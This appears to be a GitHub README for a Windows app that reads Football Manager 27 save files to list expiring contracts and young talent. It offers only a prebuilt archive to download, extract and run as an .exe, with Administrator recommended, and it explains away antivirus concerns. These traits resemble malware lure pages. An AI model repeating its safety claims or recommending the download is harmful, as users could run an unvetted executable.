# FM 27 Contract Hunter

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Downloads](https://img.shields.io/badge/Downloads-New-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop tool for Football Manager 27 that reads save files directly — finds expiring contracts and high-potential youngsters without touching game memory.

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/PolygonPhaseAbyss/fm27-contract-hunter-2026/releases/tag/1.0.0)

</div>

---

## ⚡ At a Glance

| | |
|---|---|
| **What it is** | Save-file reader for FM 27 — contract expiry and wonderkid finder |
| **Who it's for** | FM players who want to find free agents and cheap talent without memory hacks |
| **What it solves** | Existing scouts read memory (antivirus flags, game must run) |
| **How it works** | Reads the `.fm` save file directly via `fmsave` |

---

## 🔥 Why This Exists

Most FM scouting tools read game memory. That means:
- The game must be running.
- Antivirus flags them (memory reading looks like malware).
- They break after every patch.

This tool doesn't do that. It reads the **save file** — the `.fm` file on your disk. No memory access. No hooks. No game running.

It's built on `fmsave`, an open-source Python library that parses FM 26/27 saves. The library is read-only and does not modify the save.

---

## 🧩 What It Does

### Expiring Contracts
- Scan every player in your save
- Filter by contract end date (next 6 / 12 / 24 months)
- Filter by age, wage, current ability
- Export to CSV

### Wonderkid Finder
- Players under 21
- High potential ability relative to current ability
- Ranked by "value gap" — potential resale value minus current price
- Filter by position, nationality, club

### Save File Only
- No memory reading
- No game process required
- Works with Steam, Epic, and Game Pass saves (same `.fm` format)

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 200 MB | 500 MB |
| **Python** | 3.12+ (bundled) | 3.12+ |
| **Game** | FM 27 save file (`.fm`) | Latest patch |
| **Permissions** | Standard user | Administrator |

---

## 🚀 Quick Start

1. **Download** the archive using the button above
2. **Extract** with 7-Zip or WinRAR
3. **Run** `ContractHunter.exe`
4. **Select** your `.fm` save file
5. **Choose** Expiring Contracts or Wonderkid Finder

---

## ❓ FAQ

**Does this read game memory?**
No — it reads the save file on disk. No memory access, no hooks, no game process required.

**Will I get banned?**
No — this is a save file reader. It doesn't interact with the game or any online service. Single-player only.

**Does it work with the Game Pass version?**
Yes — the save file format is the same. Point it at your `.fm` file.

**Does it modify my save?**
No — it's read-only. The `fmsave` library does not write to saves.

**How accurate are the hidden attributes?**
`fmsave` reads CA/PA from the save file. Field meanings are documented as "unconfirmed" for some builds — check the output against in-game scout reports.

**How do I uninstall?**
Delete the folder. No registry entries.

---

## 🗺️ Roadmap

- [ ] Squad depth analysis
- [ ] Transfer budget planner
- [ ] CSV import for shortlists
- [ ] Multi-language support

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

**Note:** Uses `fmsave` (MIT license) for save file parsing. Not affiliated with Sports Interactive or Sega.

---

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/PolygonPhaseAbyss/fm27-contract-hunter-2026/releases/tag/1.0.0)

**Version 1.0.0** — Contract Hunter · Save File Reader · MIT

</div>
